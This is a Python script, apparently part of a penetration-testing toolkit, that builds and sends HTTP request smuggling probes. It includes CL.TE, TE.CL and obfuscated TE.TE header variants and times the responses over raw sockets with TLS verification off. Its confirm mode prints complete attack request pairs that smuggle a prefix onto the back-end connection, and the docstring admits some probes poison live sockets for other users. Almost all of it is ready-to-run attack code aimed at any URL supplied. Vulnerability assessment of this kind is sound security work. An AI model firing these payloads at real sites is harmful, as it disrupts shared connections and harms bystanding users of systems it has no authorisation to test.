#!/usr/bin/env python3
"""smuggle_probe.py - HTTP request smuggling (desync) probe builder + timing harness.

Builds byte-exact CL.TE / TE.CL / TE.TE detection requests, optionally sends them
over a raw socket (TLS included) and measures response timing against a baseline,
and emits rupu-ingestible output:

  --work-units out.json       JSON array of desync candidates (for_each / dispatch)
  --finding-template out.json findings.report payload skeleton for a confirmed desync

Examples:
  python3 scripts/smuggle_probe.py --url https://example.com/ --probe all --emit
  python3 scripts/smuggle_probe.py --url https://example.com/ --probe all --send \
      --repeat 2 --timeout 10 --work-units candidates.json
  python3 scripts/smuggle_probe.py --url https://example.com/ --probe confirm --emit
  python3 scripts/smuggle_probe.py --url https://example.com/ \
      --finding-template finding.json

Timing-harness methodology:
  1. Measure baseline: a normal POST, time-to-first-byte, N repeats (median).
  2. Send each probe on a FRESH connection; a probe whose time-to-first-byte hits the
     --timeout (or exceeds baseline * --factor) is a desync candidate.
  3. Always run CL.TE probes before TE.CL (a TE.CL probe against a CL.TE system
     poisons the live socket for other users).
  4. Confirm candidates with the --probe confirm differential pair, not timing alone.
"""
import argparse
import base64
import json
import socket
import ssl
import statistics
import sys
import time
import urllib.parse

CRLF = b"\r\n"

# TE.TE header-obfuscation mutations. Each value is the raw header block (bytes)
# that replaces the plain "Transfer-Encoding: chunked" line.
TETE_MUTATIONS = {
    "plain": b"Transfer-Encoding: chunked",
    "xchunked": b"Transfer-Encoding: xchunked",
    "space-before-colon": b"Transfer-Encoding : chunked",
    "tab-value": b"Transfer-Encoding:\tchunked",
    "space-prefix-header": b" Transfer-Encoding: chunked",
    "vertical-tab": b"Transfer-Encoding:\x0bchunked",
    "double-te-second-bogus": b"Transfer-Encoding: chunked\r\nTransfer-encoding: cow",
    "double-te-first-bogus": b"Transfer-Encoding: x\r\nTransfer-Encoding: chunked",
    "chunked-comma-identity": b"Transfer-Encoding: chunked, identity",
    "quoted": b"Transfer-Encoding: \"chunked\"",
    "truncated-value": b"Transfer-Encoding: chunk",
    "line-folded": b"Transfer-Encoding\r\n : chunked",
    "bare-lf-smuggle": b"X: X\nTransfer-Encoding: chunked",
    "casing": b"TrAnSfEr-EnCoDiNg: chunked",
}


def build_request(method, path, host, extra_header_block, body, keepalive=True):
    """Assemble a raw HTTP/1.1 request. extra_header_block: bytes, no trailing CRLF."""
    lines = [
        ("%s %s HTTP/1.1" % (method, path)).encode(),
        ("Host: %s" % host).encode(),
        b"User-Agent: Mozilla/5.0",
        b"Content-Type: application/x-www-form-urlencoded",
        b"Connection: " + (b"keep-alive" if keepalive else b"close"),
    ]
    if extra_header_block:
        lines.append(extra_header_block)
    return CRLF.join(lines) + CRLF + CRLF + body


def clte_probe(host, path, te_block=b"Transfer-Encoding: chunked"):
    """CL.TE timing probe. CL=4 forwards '1\\r\\nA'; TE back-end waits for next chunk."""
    body = b"1\r\nA\r\nX"
    hdr = te_block + CRLF + b"Content-Length: 4"
    return build_request("POST", path, host, hdr, body)


def tecl_probe(host, path, te_block=b"Transfer-Encoding: chunked"):
    """TE.CL timing probe. TE forwards '0\\r\\n\\r\\n' (5B); CL=6 back-end waits for 1 more."""
    body = b"0\r\n\r\nX"
    hdr = te_block + CRLF + b"Content-Length: 6"
    return build_request("POST", path, host, hdr, body)


def clte_confirm_pair(host, path):
    """Differential confirmation for CL.TE: attack request + clean follow-up.
    CL is computed over the exact smuggled bytes so the prefix lands on the socket."""
    smuggled = b"0\r\n\r\nGET /404doesnotexist HTTP/1.1\r\nX-Ignore: X"
    hdr = (b"Transfer-Encoding: chunked" + CRLF +
           ("Content-Length: %d" % len(smuggled)).encode())
    attack = build_request("POST", path, host, hdr, smuggled)
    follow = build_request("GET", path, host, b"", b"", keepalive=False)
    return attack, follow


def tecl_confirm_pair(host, path):
    """Differential confirmation for TE.CL: chunk size (hex) computed exactly."""
    inner = (b"POST /404doesnotexist HTTP/1.1\r\n"
             b"Content-Type: application/x-www-form-urlencoded\r\n"
             b"Content-Length: 15\r\n\r\n"
             b"x=1\r\n")
    size_line = ("%x" % len(inner)).encode() + CRLF
    body = size_line + inner + b"0" + CRLF + CRLF
    # Outer CL covers only the first chunk-size line (classic TE.CL shape).
    hdr = (("Content-Length: %d" % len(size_line)).encode() + CRLF +
           b"Transfer-Encoding: chunked")
    attack = build_request("POST", path, host, hdr, body)
    follow = build_request("GET", path, host, b"", b"", keepalive=False)
    return attack, follow


def baseline_request(host, path):
    body = b"q=1"
    hdr = ("Content-Length: %d" % len(body)).encode()
    return build_request("POST", path, host, hdr, body)


def send_raw(host, port, use_tls, data, timeout):
    """Send raw bytes on a fresh connection; return (elapsed_to_first_byte,
    status_line_or_None, timed_out)."""
    sock = socket.create_connection((host, port), timeout=timeout)
    try:
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.settimeout(timeout)
        start = time.monotonic()
        sock.sendall(data)
        try:
            first = sock.recv(4096)
            elapsed = time.monotonic() - start
            status = first.split(b"\r\n", 1)[0].decode("latin-1", "replace") if first else None
            return elapsed, status, False
        except socket.timeout:
            return time.monotonic() - start, None, True
    finally:
        try:
            sock.close()
        except OSError:
            pass


def collect_probes(host, path, which, mutation):
    """Return list of dicts: {variant, mutation, request(bytes)} in safe order."""
    probes = []
    muts = TETE_MUTATIONS if which in ("tete", "all") else {"plain": TETE_MUTATIONS["plain"]}
    if mutation:
        muts = {mutation: TETE_MUTATIONS[mutation]}
    # CL.TE first (safe ordering), then TE.CL.
    if which in ("clte", "tete", "all"):
        for name, block in muts.items():
            probes.append({"variant": "CL.TE", "mutation": name,
                           "request": clte_probe(host, path, block)})
    if which in ("tecl", "tete", "all"):
        for name, block in muts.items():
            probes.append({"variant": "TE.CL", "mutation": name,
                           "request": tecl_probe(host, path, block)})
    return probes


def finding_template(url, host):
    return {
        "title": "HTTP request smuggling (CL.TE) via front-end/back-end desync",
        "scope": "endpoint",
        "target_ref": url,
        "severity": "high",
        "classification": {"cwe": "CWE-444", "owasp": "WSTG-INPV"},
        "evidence": {
            "rationale": ("Front-end honors Content-Length while back-end honors "
                          "Transfer-Encoding. REPLACE: timing delta vs baseline and the "
                          "differential confirmation (smuggled GET /404doesnotexist "
                          "prefix caused a fresh GET / to return 404)."),
            "http_exchange": ("REPLACE with the exact raw attack request bytes, the "
                              "follow-up request, and both responses (baseline vs "
                              "poisoned), e.g.: POST / HTTP/1.1\\r\\nHost: %s..." % host),
            "artifacts": ["probe_timings.json", "smuggler.log"],
        },
    }


def main():
    ap = argparse.ArgumentParser(description="Request smuggling probe builder/harness")
    ap.add_argument("--url", required=True, help="e.g. https://example.com/")
    ap.add_argument("--probe", default="all",
                    choices=["clte", "tecl", "tete", "confirm", "all"])
    ap.add_argument("--mutation", choices=sorted(TETE_MUTATIONS),
                    help="restrict TE.TE to one named mutation")
    ap.add_argument("--variant", default="clte", choices=["clte", "tecl"],
                    help="which confirm pair to build (with --probe confirm)")
    ap.add_argument("--emit", action="store_true",
                    help="print probe bytes (escaped) instead of/besides sending")
    ap.add_argument("--send", action="store_true", help="send probes, time responses")
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--repeat", type=int, default=2, help="sends per probe")
    ap.add_argument("--baseline", type=int, default=3, help="baseline request count")
    ap.add_argument("--factor", type=float, default=5.0,
                    help="candidate if elapsed > baseline_median * factor")
    ap.add_argument("--work-units", metavar="FILE",
                    help="write desync-candidate work-units JSON array")
    ap.add_argument("--finding-template", metavar="FILE",
                    help="write a findings.report payload skeleton")
    args = ap.parse_args()

    u = urllib.parse.urlsplit(args.url)
    host = u.hostname
    use_tls = u.scheme == "https"
    port = u.port or (443 if use_tls else 80)
    path = u.path or "/"
    if u.query:
        path += "?" + u.query

    if args.finding_template:
        with open(args.finding_template, "w") as f:
            json.dump(finding_template(args.url, host), f, indent=2)
        print("[+] finding template -> %s" % args.finding_template)

    if args.probe == "confirm":
        pair = clte_confirm_pair(host, path) if args.variant == "clte" \
            else tecl_confirm_pair(host, path)
        for label, req in zip(("ATTACK", "FOLLOW-UP (fresh connection)"), pair):
            print("--- %s ---" % label)
            print(req.decode("latin-1").replace("\r\n", "\\r\\n\n"))
        print("Send ATTACK, then FOLLOW-UP on a NEW connection within a few seconds;")
        print("a 404 on the follow-up (baseline 200) confirms the desync. Repeat 5-10x.")
        return

    probes = collect_probes(host, path, args.probe, args.mutation)
    results = []

    base_med = None
    if args.send:
        times = []
        for _ in range(max(1, args.baseline)):
            el, st, to = send_raw(host, port, use_tls, baseline_request(host, path),
                                  args.timeout)
            times.append(el)
            print("[baseline] %.3fs %s" % (el, st or "TIMEOUT"))
        base_med = statistics.median(times)
        print("[baseline] median %.3fs" % base_med)

    for p in probes:
        if args.emit or not args.send:
            print("--- %s / %s ---" % (p["variant"], p["mutation"]))
            print(p["request"].decode("latin-1").replace("\r\n", "\\r\\n\n"))
        rec = {"variant": p["variant"], "mutation": p["mutation"],
               "probe_b64": base64.b64encode(p["request"]).decode()}
        if args.send:
            worst, status, timed_out = 0.0, None, False
            for _ in range(max(1, args.repeat)):
                el, st, to = send_raw(host, port, use_tls, p["request"], args.timeout)
                worst = max(worst, el)
                status = st or status
                timed_out = timed_out or to
            candidate = timed_out or (base_med is not None and worst > base_med * args.factor)
            rec.update({"elapsed_max": round(worst, 3), "status": status,
                        "timed_out": timed_out, "candidate": candidate,
                        "baseline_median": round(base_med, 3)})
            flag = "CANDIDATE" if candidate else "ok"
            print("[%s] %s/%s %.3fs %s %s" %
                  (flag, p["variant"], p["mutation"], worst,
                   status or "TIMEOUT", "(timeout)" if timed_out else ""))
        results.append(rec)

    if args.work_units:
        cands = [r for r in results if r.get("candidate")] if args.send else results
        units = []
        for r in cands:
            evidence = ("delay %ss vs baseline %ss" %
                        (r.get("elapsed_max"), r.get("baseline_median"))
                        if args.send else "untested probe (emit mode)")
            units.append({
                "id": "smuggle-%s-%s-%s" % (r["variant"].replace(".", "").lower(),
                                            r["mutation"], host),
                "title": "%s desync candidate (%s) on %s" %
                         (r["variant"], r["mutation"], args.url),
                "targets": [args.url],
                "hints": {"variant": r["variant"], "mutation": r["mutation"],
                          "probe_b64": r["probe_b64"], "evidence": evidence,
                          "next": "confirm with --probe confirm --variant "
                                  + ("clte" if r["variant"] == "CL.TE" else "tecl")},
            })
        with open(args.work_units, "w") as f:
            json.dump(units, f, indent=2)
        print("[+] %d work unit(s) -> %s" % (len(units), args.work_units))

    json.dump({"url": args.url, "results": results}, sys.stdout, indent=2)
    print()


if __name__ == "__main__":
    main()
